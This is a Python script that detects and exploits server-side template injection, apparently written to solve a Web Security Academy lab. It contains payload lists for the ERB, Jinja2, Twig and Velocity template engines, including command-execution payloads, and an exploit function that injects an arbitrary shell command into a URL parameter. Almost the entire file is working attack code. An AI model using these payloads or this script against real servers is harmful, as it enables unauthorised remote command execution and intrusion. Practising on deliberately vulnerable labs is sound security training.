import requests
from urllib.parse import quote

# Dictionary containing payloads for various template engines
payloads = {
    "erb": ["<%= 7*7 %>", "<%= system('ls') %>"],
    "jinja2": ["{{ 7*7 }}", "{{ ''.__class__.__mro__[1].__subclasses__()[59]('ls').read() }}"],
    "twig": ["{{ 7*7 }}", "{{ system('ls') }}"],
    "velocity": ["#set($x = 7 * 7)", "$x", "#set($x = 7 * 7) $x", "#set($cmd = 'ls')", "#foreach($i in [1])", "$i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd)", "#end"]
}

def check_ssti(url, param):
    """
    Check for SSTI (Server-Side Template Injection) vulnerabilities.

    Args:
        url (str): The target URL to test.
        param (str): The parameter name to inject the payload into.

    Returns:
        tuple: A tuple containing a boolean indicating if SSTI was detected,
               the engine name (str) if SSTI was detected, and the payload (str) used.
    """
    for engine, tests in payloads.items():
        for payload in tests:
            encoded_payload = quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"

            try:
                response = requests.get(test_url)
                if response.status_code == 200 and "49" in response.text:
                    print(f"[+] SSTI vulnerability detected with {engine} payload: {payload}")
                    return True, engine, payload
                else:
                    print(f"[-] SSTI vulnerability not detected with {engine} payload: {payload}")
            except requests.RequestException as e:
                print(f"[-] An error occurred: {e}")
    
    return False, None, None

def exploit_ssti(url, param, engine, command):
    """
    Exploit the SSTI vulnerability by executing a command.

    Args:
        url (str): The target URL.
        param (str): The parameter name to inject the payload into.
        engine (str): The template engine used in the SSTI.
        command (str): The command to execute on the server.

    Returns:
        None
    """
    if engine not in payloads:
        print("[-] Unsupported template engine.")
        return
    if engine == "erb":
        exploit_payload = f"<%= system('{command}') %>"
    elif engine == "jinja2":
        exploit_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[59]('{command}').read() }}}}"
    elif engine == "twig":
        exploit_payload = f"{{{{ system('{command}') }}}}"
    elif engine == "velocity":
        exploit_payload = f"#set($cmd = '{command}') #foreach($i in [1]) $i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd) #end"
    else:
        print("[-] Unsupported template engine.")
        return

    exploit_url = f"{url}?{param}={quote(exploit_payload)}"
    try:
        response = requests.get(exploit_url)
        if response.status_code == 200:
            print(f"[+] Command executed successfully: {command}")
        else:
            print(f"[-] Command execution failed.")
    except requests.RequestException as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    target_url = "https://0a9b00f003adc81281231bf40098000f.web-security-academy.net/"
    param = "message"

    ssti_detected, engine, payload = check_ssti(target_url, param)
    if ssti_detected:
        # Replace 'ls /home/carlos' with the command you want to execute
        exploit_ssti(target_url, param, engine, "ls /home/carlos")
